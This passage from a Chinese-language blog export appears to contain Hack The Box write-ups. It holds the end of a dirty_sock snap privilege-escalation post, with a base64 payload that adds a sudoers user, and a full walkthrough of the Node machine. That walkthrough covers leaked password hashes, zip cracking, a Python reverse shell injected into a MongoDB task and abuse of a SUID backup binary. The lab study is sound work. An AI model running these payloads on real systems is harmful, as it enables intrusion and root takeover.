&#39;print&quot;aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&quot;+ &quot;A&quot;*4256 + &quot;==&quot;&#39; | base64 -d &gt; exploit.snap 直接运行改文件，发现还有一点错误，需要想办法解决一下 加上 –devmode 成功安装 sudo /usr/bin/snap install --devmode exploit.snap 切换到 dirty_sock 用户，密码也是 dirty_sock 查看一下权限 提权成功 成功拿到root权限的flag","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Node - Hackthebox","slug":"Hackthebox/Medium/Hackthebox-Node","date":"2022-08-01T11:38:36.000Z","updated":"2023-06-13T03:47:47.000Z","comments":true,"path":"2022/08/01/Hackthebox/Medium/Hackthebox-Node/","link":"","permalink":"http://www.lucifiel.com/2022/08/01/Hackthebox/Medium/Hackthebox-Node/","excerpt":"","text":"Hackthebox - Node靶场信息 靶场类型 信息收集Nmap┌──(root㉿lucifiel)-[~/Desktop] └─# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.58 Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-12 09:40 CST Nmap scan report for 10.10.10.58 Host is up (0.57s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA) | 256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA) |_ 256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519) 3000/tcp open hadoop-tasktracker Apache Hadoop | hadoop-tasktracker-info: |_ Logs: /login |_http-title: MyPlace | hadoop-datanode-info: |_ Logs: /login Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 3.2 - 4.9 (92%), Crestron XPanel control system (90%), Linux 3.13 (89%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 3.5 (87%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 22/tcp) HOP RTT ADDRESS 1 647.66 ms 10.10.14.1 2 647.71 ms 10.10.10.58 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 93.80 seconds Http 这边首页面看到有个登陆点，直接去看看 测试了一下弱口令，没进去，也没什么其他可以点的点了，fuzz 也没找到什么东西 在主页抓到一个 js，里面有一个地址 &#x2F;api&#x2F;users，去看一下 [{&quot;_id&quot;:&quot;59a7365b98aa325cc03ee51c&quot;,&quot;username&quot;:&quot;myP14ceAdm1nAcc0uNT&quot;,&quot;password&quot;:&quot;dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af&quot;,&quot;is_admin&quot;:true}, {&quot;_id&quot;:&quot;59a7368398aa325cc03ee51d&quot;,&quot;username&quot;:&quot;tom&quot;,&quot;password&quot;:&quot;f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240&quot;,&quot;is_admin&quot;:false}, {&quot;_id&quot;:&quot;59a7368e98aa325cc03ee51e&quot;,&quot;username&quot;:&quot;mark&quot;,&quot;password&quot;:&quot;de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73&quot;,&quot;is_admin&quot;:false}, {&quot;_id&quot;:&quot;59aa9781cced6f1d1490fce9&quot;,&quot;username&quot;:&quot;rastating&quot;,&quot;password&quot;:&quot;5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0&quot;,&quot;is_admin&quot;:false}] 去尝试解密一下 username = myP14ceAdm1nAcc0uNT password = manchester 成功解密出 myP14ceAdm1nAcc0uNT 的密码，这是一个管理员账户，去登陆页面登录一下 漏洞利用 成功登陆，然后有一个备份文件可以下载，下载一下 wget --header &quot;Cookie: connect.sid=s%3AjDIfsWcluCPkFQHEKYIaZu2c5fEgPznp.td17K8ciAiS8uXhzf4h0SM71BuRxWE%2BdLoPQvRI9XkQ&quot; http://10.10.10.58:3000/api/admin/backup 这个文件下载存在一些问题，尝试多次都会在大概 0.6% 左右的进度停止下载 所以我们用 wget 进行自动多次尝试下载，然后挂着等下载完成吧 如果还是不行，就尝试用 curl 进行请求 curl -s -XGET -b &#39;connect.sid=s%3AjDIfsWcluCPkFQHEKYIaZu2c5fEgPznp.td17K8ciAiS8uXhzf4h0SM71BuRxWE%2BdLoPQvRI9XkQ&#39; http://10.10.10.58:3000/api/admin/backup -o myplace.backup ┌──(root㉿lucifiel)-[~/Desktop] └─# file myplace.backup myplace.backup: ASCII text, with very long lines (64652), with no line terminators 查看了一下内容和类型，感觉像是 base64 编码，去解码一下 ┌──(root㉿lucifiel)-[~/Desktop] └─# cat myplace.backup | base64 -d &gt; unknow ┌──(root㉿lucifiel)-[~/Desktop] └─# file unknow unknow: Zip archive data, at least v1.0 to extract, compression method=store ┌──(root㉿lucifiel)-[~/Desktop] └─# mv unknow myplace.zip 是一个 zip 类型的，那就尝试解压一下 ┌──(root㉿lucifiel)-[~/Desktop] └─# unzip myplace.zip Archive: myplace.zip creating: var/www/myplace/ [myplace.zip] var/www/myplace/package-lock.json password: 需要一个解压密码 ┌──(root㉿lucifiel)-[~/Desktop] └─# fcrackzip -D -p /usr/share/wordlists/rockyou.txt myplace.zip possible pw found: magicword 解压密码出来了，去解压一下 ┌──(root㉿lucifiel)-[~/Desktop/var/www/myplace] └─# ls -la 总用量 56 drwxr-xr-x 4 root root 4096 9月 3 2017 . drwxr-xr-x 3 root root 4096 7月 12 20:24 .. -rw-rw-r-- 1 root root 3861 9月 2 2017 app.html -rw-rw-r-- 1 root root 8058 9月 3 2017 app.js drwxr-xr-x 69 root root 4096 9月 2 2017 node_modules -rw-rw-r-- 1 root root 283 9月 2 2017 package.json -rw-r--r-- 1 root root 21264 9月 2 2017 package-lock.json drwxrwxr-x 6 root root 4096 9月 2 2017 static 有一些文件，到处看看有没有有用的东西吧 ┌──(root㉿lucifiel)-[~/Desktop/var/www/myplace] └─# grep -Ri password . 使用上面的命令进行筛选，我们看到有一个 mongodb ┌──(root㉿lucifiel)-[~/Desktop/var/www/myplace] └─# cat app.js const express = require(&#39;express&#39;); const session = require(&#39;express-session&#39;); const bodyParser = require(&#39;body-parser&#39;); const crypto = require(&#39;crypto&#39;); const MongoClient = require(&#39;mongodb&#39;).MongoClient; const ObjectID = require(&#39;mongodb&#39;).ObjectID; const path = require(&quot;path&quot;); const spawn = require(&#39;child_process&#39;).spawn; const app = express(); const url = &#39;mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&amp;authSource=myplace&#39;; const backup_key = &#39;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&#39;; 查看 app.js 其中和 mangodb 有关的只有 const url 这一句 所以我们到了一个账号密码 username = mark password = 5AYRft73VtFpc84k 目前只有 22 和 3000 端口打开，3000 端口我们已经是 admin 权限了，自然不可能，所以应该是 22 端口 ┌──(root㉿lucifiel)-[~/Desktop] └─# ssh mark@10.10.10.58 The authenticity of host &#39;10.10.10.58 (10.10.10.58)&#39; can&#39;t be established. ED25519 key fingerprint is SHA256:l5rO4mtd28sC7Bh8t7rHpUxqmHnGYUDxX1DHmLFrzrk. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.10.58&#39; (ED25519) to the list of known hosts. mark@10.10.10.58&#39;s password: The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. .-. .-&#39;``(|||) ,`\\ \\ `-`. 88 88 / \\ &#39;``-. ` 88 88 .-. , `___: 88 88 88,888, 88 88 ,88888, 88888 88 88 (:::) : ___ 88 88 88 88 88 88 88 88 88 88 88 `-` ` , : 88 88 88 88 88 88 88 88 88 88 88 \\ / ,..-` , 88 88 88 88 88 88 88 88 88 88 88 `./ / .-.` &#39;88888&#39; &#39;88888&#39; &#39;88888&#39; 88 88 &#39;8888 &#39;88888&#39; `-..-( ) `-` The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Wed Sep 27 02:33:14 2017 from 10.10.14.3 mark@node:~$ whoami&amp;&amp;id mark uid=1001(mark) gid=1001(mark) groups=1001(mark) 成功拿到 user 权限 进来后在用户目录下没有看到 flag 文件 &#x2F;home&#x2F;tom&#x2F;user.txt 通过 find 查找，在 tom 目录下找到了 flag 文件 mark@node:/home/tom$ cat user.txt cat: user.txt: Permission denied 但是我们没有权限 权限提升Tommark@node:/home$ ps aux | grep tom tom 1231 0.0 8.6 1033968 65472 ? Ssl 02:21 0:22 /usr/bin/node /var/www/myplace/app.js tom 1238 0.0 5.7 1008568 43220 ? Ssl 02:21 0:07 /usr/bin/node /var/scheduler/app.js mark 16416 0.0 0.1 14228 932 pts/0 S+ 13:43 0:00 grep --color=auto tom 查看一下 Tom 运行的文件 mark@node:/home$ cat /var/scheduler/app.js const exec = require(&#39;child_process&#39;).exec; const MongoClient = require(&#39;mongodb&#39;).MongoClient; const ObjectID = require(&#39;mongodb&#39;).ObjectID; const url = &#39;mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&amp;authSource=scheduler&#39;; MongoClient.connect(url, function(error, db) { if (error || !db) { console.log(&#39;[!] Failed to connect to mongodb&#39;); return; } setInterval(function () { db.collection(&#39;tasks&#39;).find().toArray(function (error, docs) { if (!error &amp;&amp; docs) { docs.forEach(function (doc) { if (doc) { console.log(&#39;Executing task &#39; + doc._id + &#39;...&#39;); exec(doc.cmd); db.collection(&#39;tasks&#39;).deleteOne({ _id: new ObjectID(doc._id) }); } }); } else if (error) { console.log(&#39;Something went wrong: &#39; + error); } }); }, 30000); }); 可以看到 &#x2F;var&#x2F;scheduler&#x2F;app.js 连接了名为 scheduler 的 mongodb 数据库，在名为 tasks 的集合中搜索文档并执行 ‘cmd’ 字段 让我们连接到 mongodb 并在任务集合中插入一个新文档。我们希望用户 tom 执行的命令将在“cmd”字段中。 mark@node:~$ mongo localhost:27017/scheduler -u mark -p 5AYRft73VtFpc84k MongoDB shell version: 3.2.16 db.tasks.insert({&quot;cmd&quot;:&quot;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\&quot;10.10.14.6\\&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\\&quot;sh\\&quot;)&#39;&quot;}); 使用 nc 监听一个端口 nc -nvlp 4444 ┌──(root㉿lucifiel)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.6] from (UNKNOWN) [10.10.10.58] 41470 $ python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;; python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;; To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;. See &quot;man sudo_root&quot; for details. tom@node:/$ whoami&amp;&amp;id whoami&amp;&amp;id tom uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin) 成功提权到 Tom tom@node:~$ pwd pwd /home/tom tom@node:~$ ls ls user.txt tom@node:~$ cat user.txt cat user.txt e1156acc3574e04b06908ecf76be91b1 成功获取到 user 权限的 flag 文件 Rootfind / -type f -perm -4000 2&gt;/dev/null 检查一波 suid 信息 显示 tom 具有的权限 tom@node:/$ find / -type f -perm -4000 2&gt;/dev/null find / -type f -perm -4000 2&gt;/dev/null /usr/lib/eject/dmcrypt-get-device /usr/lib/snapd/snap-confine /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic /usr/lib/openssh/ssh-keysign /usr/lib/policykit-1/polkit-agent-helper-1 /usr/local/bin/backup /usr/bin/chfn /usr/bin/at /usr/bin/gpasswd /usr/bin/newgidmap /usr/bin/chsh /usr/bin/sudo /usr/bin/pkexec /usr/bin/newgrp /usr/bin/passwd /usr/bin/newuidmap /bin/ping /bin/umount /bin/fusermount /bin/ping6 /bin/ntfs-3g /bin/su /bin/mount 看起来最异常的就是 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;backup 了 tom@node:/$ file /usr/local/bin/backup file /usr/local/bin/backup /usr/local/bin/backup: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=343cf2d93fb2905848a42007439494a2b4984369, not stripped 查看一下文件格式可以确定是一个二进制文件 检查一下文件 &#x2F;var&#x2F;www&#x2F;myplace&#x2F;app.js &#39;QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ&#39;, &#39;QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ&#39;, &#39;QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ&#39;, &#39;QQQQQQQQQQQQQQQQQQQWQQQQQWWWBBBHHHHHHHHHBWWWQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ&#39;, &#39;QQQQQQQQQQQQQQQD!`__ssaaaaaaaaaass_ass_s____. -~&quot;&quot;??9VWQQQQQQQQQQQQQQQQQQQ&#39;, &#39;QQQQQQQQQQQQQP\\&#39;_wmQQQWWBWV?GwwwmmWQmwwwwwgmZUVVHAqwaaaac,&quot;?9$QQQQQQQQQQQQQQ&#39;, &#39;QQQQQQQQQQQW! aQWQQQQW?qw#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4QQQQQQQQQQQ&#39;, &#39;QQQQQQQQQQW\\&#39; jQQQQWTqwDYauT9mmwwawww?WWWWQQQQQ@TT?TVTT9HQQQQQQw,-4QQQQQQQQQ&#39;, &#39;QQQQQQQQQQ[ jQQQQQyWVw2$wWWQQQWWQWWWW7WQQQQQQQQPWWQQQWQQw7WQQQWWc)WWQQQQQQQ&#39;, &#39;QQQQQQQQQf jQQQQQWWmWmmQWU???????9WWQmWQQQQQQQWjWQQQQQQQWQmQQQQWL 4QQQQQQQQ&#39;, &#39;QQQQQQQP\\&#39;.yQQQQQQQQQQQP&quot; &lt;wa,.!4WQQQQQQQWdWP??!&quot;??4WWQQQWQQc ?QWQQQQQ&#39;, &#39;QQQQQP\\&#39;_a.&lt;aamQQQW!&lt;yF &quot;!` .. &quot;??$Qa &quot;WQQQWTVP\\&#39; &quot;??\\&#39; =QQmWWV?46/ ?QQQQQ&#39;, &#39;QQQP\\&#39;sdyWQP?!`.-&quot;?46mQQQQQQT!mQQgaa. &lt;wWQQWQaa _aawmWWQQQQQQQQQWP4a7g -WWQQ&#39;, &#39;QQ[ j@mQP\\&#39;adQQP4ga, -????&quot; &lt;jQQQQQWQQQQQQQQQWW;)WQWWWW9QQP?&quot;` -?QzQ7L ]QQQ&#39;, &#39;QW jQkQ@ jWQQD\\&#39;-?$QQQQQQQQQQQQQQQQQWWQWQQQWQQQc &quot;4QQQQa .QP4QQQQfWkl jQQQ&#39;, &#39;QE ]QkQk $D?` waa &quot;?9WWQQQP??T?47`_aamQQQQQQWWQw,-?QWWQQQQQ`&quot;QQQD\\Qf(.QWQQ&#39;, &#39;QQ,-Qm4Q/-QmQ6 &quot;WWQma/ &quot;??QQQQQQL 4W&quot;- -?$QQQQWP`s,awT$QQQ@ &quot;QW@?$:.yQQQQ&#39;, &#39;QQm/-4wTQgQWQQ, ?4WWk 4waac -???$waQQQQQQQQF??\\&#39;&lt;mWWWWWQW?^ ` ]6QQ\\&#39; yQQQQQ&#39;, &#39;QQQQw,-?QmWQQQQw a, ?QWWQQQw _. &quot;????9VWaamQWV???&quot; a j/ ]QQf jQQQQQQ&#39;, &#39;QQQQQQw,&quot;4QQQQQQm,-$Qa ???4F jQQQQQwc &lt;aaas _aaaaa 4QW ]E )WQ`=QQQQQQQ&#39;, &#39;QQQQQQWQ/ $QQQQQQQa ?H ]Wwa, ???9WWWh dQWWW,=QWWU? ?! )WQ ]QQQQQQQ&#39;, &#39;QQQQQQQQQc-QWQQQQQW6, QWQWQQQk &lt;c jWQ ]QQQQQQQ&#39;, &#39;QQQQQQQQQQ,&quot;$WQQWQQQQg,.&quot;?QQQQ\\&#39;.mQQQmaa,., . .; QWQ.]QQQQQQQ&#39;, &#39;QQQQQQQQQWQa ?$WQQWQQQQQa,.&quot;?( mQQQQQQW[:QQQQm[ ammF jy! j( } jQQQ(:QQQQQQQ&#39;, &#39;QQQQQQQQQQWWma &quot;9gw?9gdB?QQwa, -??T$WQQ;:QQQWQ ]WWD _Qf +?! _jQQQWf QQQQQQQ&#39;, &#39;QQQQQQQQQQQQQQQws &quot;Tqau?9maZ?WQmaas,, --~-- --- . _ssawmQQQQQQk 3QQQQWQ&#39;, &#39;QQQQQQQQQQQQQQQQWQga,-?9mwad?1wdT9WQQQQQWVVTTYY?YTVWQQQQWWD5mQQPQQQ ]QQQQQQ&#39;, &#39;QQQQQQQWQQQQQQQQQQQWQQwa,-??$QwadV}&lt;wBHHVHWWBHHUWWBVTTTV5awBQQD6QQQ ]QQQQQQ&#39;, &#39;QQQQQQQQQQQQQQQQQQQQQQWWQQga,-&quot;9$WQQmmwwmBUUHTTVWBWQQQQWVT?96aQWQQQ ]QQQQQQ&#39;, &#39;QQQQQQQQQQWQQQQWQQQQQQQQQQQWQQma,-?9$QQWWQQQQQQQWmQmmmmmQWQQQQWQQW(.yQQQQQW&#39;, &#39;QQQQQQQQQQQQQWQQQQQQWQQQQQQQQQQQQQga%,. -??9$QQQQQQQQQQQWQQWQQV? sWQQQQQQQ&#39;, &#39;QQQQQQQQQWQQQQQQQQQQQQQQWQQQQQQQQQQQWQQQQmywaa,;~^&quot;!???????!^`_saQWWQQQQQQQ&#39;, &#39;QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQWWWWQQQQQmwywwwwwwmQQWQQQQQQQQQQQ&#39;, &#39;QQQQQQQWQQQWQQQQQQWQQQWQQQQQWQQQQQQQQQQQQQQQQWQQQQQWQQQWWWQQQQQQQQQQQQQQQWQ&#39;, 看到一个有趣的东西，应该还有其他的东西 const backup_key = &#39;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&#39;; 拿到了一个 key app.get(&#39;/api/admin/backup&#39;, function (req, res) { if (req.session.user &amp;&amp; req.session.user.is_admin) { var proc = spawn(&#39;/usr/local/bin/backup&#39;, [&#39;-q&#39;, backup_key, __dirname ]); var backup = &#39;&#39;; backup 的运行格式是 backup -q key 文件目录，然后就会把我们指定的目录给打包为压缩文件 还记得我们在 app.js 中找到的密钥 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 吗？派上用场了 tom@node:/usr/local/bin$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root &lt;ac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root [+] Finished! Encoded backup is below: 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 得到了一串 base64 码，进行查看并解压 ┌──(root㉿lucifiel)-[~/Desktop] └─# base64 -d base &gt; base_encode ┌──(root㉿lucifiel)-[~/Desktop] └─# file base_encode base_encode: Zip archive data, at least v5.1 to extract, compression method=AES Encrypted 确实是会被压缩为 zip 文件 ┌──(root㉿lucifiel)-[~/Desktop] └─# unzip base_encode Archive: base_encode skipping: root.txt need PK compat. v5.1 (can do v4.6) ┌──(root㉿lucifiel)-[~/Desktop] └─# cat root.txt QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ QQQQQQQQQQQQQQQQQQQWQQQQQWWWBBBHHHHHHHHHBWWWQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ QQQQQQQQQQQQQQQD!`__ssaaaaaaaaaass_ass_s____. -~&quot;&quot;??9VWQQQQQQQQQQQQQQQQQQQ QQQQQQQQQQQQQP&#39;_wmQQQWWBWV?GwwwmmWQmwwwwwgmZUVVHAqwaaaac,&quot;?9$QQQQQQQQQQQQQQ QQQQQQQQQQQW! aQWQQQQW?qw#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4QQQQQQQQQQQ QQQQQQQQQQW&#39; jQQQQWTqwDYauT9mmwwawww?WWWWQQQQQ@TT?TVTT9HQQQQQQw,-4QQQQQQQQQ QQQQQQQQQQ[ 